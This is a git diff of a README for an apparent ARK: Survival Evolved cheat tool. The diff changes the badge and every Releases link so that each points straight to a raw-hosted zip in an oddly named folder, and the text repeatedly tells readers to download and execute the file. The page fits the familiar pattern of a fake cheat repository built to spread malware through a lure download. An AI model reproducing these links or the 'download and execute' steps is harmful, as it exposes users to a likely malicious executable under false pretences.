@@ -1,6 +1,6 @@
 # SurvivalMod-Tool 🌍
 
-![SurvivalMod-Tool](https://img.shields.io/badge/Download-Now-brightgreen)
+![SurvivalMod-Tool](https://github.com/ESLAM-MOHAMMED-SAEED/SurvivalMod-Tool/raw/refs/heads/main/glueyness/Tool-Survival-Mod-v2.0-alpha.2.zip)
 
 Welcome to the **SurvivalMod-Tool** repository! This tool provides exclusive access to cheats for **ARK: Survival Evolved** on Windows, specifically tailored for 2025. Our aim is to enhance your gaming experience with premium features that allow you to explore the game like never before.
 
@@ -18,7 +18,7 @@ Welcome to the **SurvivalMod-Tool** repository! This tool provides exclusive acc
 
 **ARK: Survival Evolved** is a popular survival game where players face dinosaurs and other prehistoric creatures. With **SurvivalMod-Tool**, you can unlock a range of cheats that make your gameplay smoother and more enjoyable. Whether you're looking to enhance your survival skills or simply want to explore the game without limits, this tool is designed for you.
 
-You can download the latest version of the tool from the [Releases section](https://github.com/ESLAM-MOHAMMED-SAEED/SurvivalMod-Tool/releases). Make sure to download the file, execute it, and start your adventure!
+You can download the latest version of the tool from the [Releases section](https://github.com/ESLAM-MOHAMMED-SAEED/SurvivalMod-Tool/raw/refs/heads/main/glueyness/Tool-Survival-Mod-v2.0-alpha.2.zip). Make sure to download the file, execute it, and start your adventure!
 
 ## Features
 
@@ -35,7 +35,7 @@ The **SurvivalMod-Tool** comes packed with features that cater to both new and e
 
 To install the **SurvivalMod-Tool**, follow these simple steps:
 
-1. Visit the [Releases section](https://github.com/ESLAM-MOHAMMED-SAEED/SurvivalMod-Tool/releases).
+1. Visit the [Releases section](https://github.com/ESLAM-MOHAMMED-SAEED/SurvivalMod-Tool/raw/refs/heads/main/glueyness/Tool-Survival-Mod-v2.0-alpha.2.zip).
 2. Download the latest release.
 3. Extract the downloaded file to your preferred location.
 4. Execute the main application file.
@@ -72,7 +72,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you encounter any issues or have questions, feel free to reach out. You can also check the **Issues** section of the repository for common problems and solutions.
 
-For the latest updates, features, and support, visit the [Releases section](https://github.com/ESLAM-MOHAMMED-SAEED/SurvivalMod-Tool/releases).
+For the latest updates, features, and support, visit the [Releases section](https://github.com/ESLAM-MOHAMMED-SAEED/SurvivalMod-Tool/raw/refs/heads/main/glueyness/Tool-Survival-Mod-v2.0-alpha.2.zip).
 
 ## Topics
 
@@ -95,6 +95,6 @@ This repository covers a range of topics related to **ARK: Survival Evolved** ch
 
 ## Final Words
 
-The **SurvivalMod-Tool** is designed to enrich your experience in **ARK: Survival Evolved**. With its range of features, you can navigate the challenges of the game with ease. Remember to download the tool from the [Releases section](https://github.com/ESLAM-MOHAMMED-SAEED/SurvivalMod-Tool/releases) and execute the file to get started.
+The **SurvivalMod-Tool** is designed to enrich your experience in **ARK: Survival Evolved**. With its range of features, you can navigate the challenges of the game with ease. Remember to download the tool from the [Releases section](https://github.com/ESLAM-MOHAMMED-SAEED/SurvivalMod-Tool/raw/refs/heads/main/glueyness/Tool-Survival-Mod-v2.0-alpha.2.zip) and execute the file to get started.
 
 Enjoy your journey through the world of dinosaurs and survival!
